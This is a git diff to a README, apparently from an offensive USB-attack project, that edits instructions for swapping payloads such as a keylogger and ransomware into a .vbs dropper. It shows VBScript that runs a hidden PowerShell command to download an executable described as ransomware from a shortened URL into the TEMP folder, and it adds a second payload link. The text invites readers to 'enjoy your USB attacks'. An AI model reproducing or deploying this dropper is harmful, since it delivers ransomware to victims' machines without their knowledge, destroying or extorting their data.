@@ -293,8 +293,9 @@ Video of it in action: https://www.youtube.com/watch?v=ll4ojo6q-rM
 
 After testing alot, we loved the stealth this kind of attack gives, so we tried to apply this kind of USB attack with our other payloads such as [keylogger](https://github.com/therealhalonen/PhishSticks/tree/master/payloads/keylogger) and [ransomware](https://github.com/therealhalonen/PhishSticks/tree/master/payloads/ransomware)
 
-Just modify the .vbs file with the payload you want and enjoy your USB attacks! (remember to host the downloadable payloads in your attacker machines folder! (or replace the attacker IP with the source of the malware like https://tinyurl.com/36xacafn for example is the source of the ransomware)
-https://tinyurl.com/36xacafn
+Just modify the .vbs file with the payload you want and enjoy your USB attacks! (remember to host the downloadable payloads in your attacker machines folder! (or replace the attacker IP with the source of the malware like for example https://tinyurl.com/36xacafn is the source of the ransomware from our GitHub while https://tinyurl.com/3va6t8n7 is the raport.txt)
+
+
 Script that downloads the ransomware that executes in the TEMP folder + raport.txt.
 ```
 Set objShell = CreateObject("Wscript.Shell")
@@ -314,7 +315,7 @@ Loop
 openRaport = "cmd /c start """" %TEMP%\raport.txt"
 objShell.Run openRaport, 0, True
 
-' Download executable from attacker ip
+' Download the executable from attacker ip or other source
 downloadCmd = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/36xacafn', '%TEMP%\encrypt.exe')"""
 objShell.Run downloadCmd, 0, True
 WScript.Sleep 2000 ' Wait for 2 seconds initially (adjust this if needed)
